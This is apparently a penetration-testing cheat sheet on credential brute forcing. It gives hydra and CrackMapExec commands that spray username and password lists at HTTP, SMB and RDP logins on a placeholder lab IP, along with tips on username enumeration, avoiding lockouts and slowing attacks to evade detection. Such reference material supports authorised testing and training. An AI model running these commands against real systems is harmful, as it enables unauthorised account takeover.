# Credential Brute Forcing

!!! tip "Tip"
    Username enumeration via timing or error message differences is often easier than brute-forcing — confirm valid usernames first, then target those with a password list.

!!! warning "Watch out"
    Always check for account lockout before running hydra or Burp Intruder. A single locked account will alert a blue team immediately. Test with 2-3 attempts on a throwaway account first.

---

## Hydra

### HTTP Basic Authentication

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/dirb/wordlists/others/best1050.txt 10.10.10.10 http-get
```

### HTTP POST Form

```bash
hydra -L users.txt -P passwords.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

### SMB

```bash
hydra -L users.txt -P passwords.txt smb://10.10.10.10
```

---

## CrackMapExec

### Web Authentication

```bash
crackmapexec http 10.10.10.10 -u users.txt -p passwords.txt --auth-form /login.php
```

### SMB

```bash
crackmapexec smb 10.10.10.10 -u users.txt -p passwords.txt
```

### RDP

```bash
crackmapexec rdp 10.10.10.10 -u users.txt -p passwords.txt
```

---

## Lockout Prevention

- Use a slow attack rate: add delays between requests to reduce detection.
- Monitor response messages: some applications return different error messages for valid vs. invalid users.
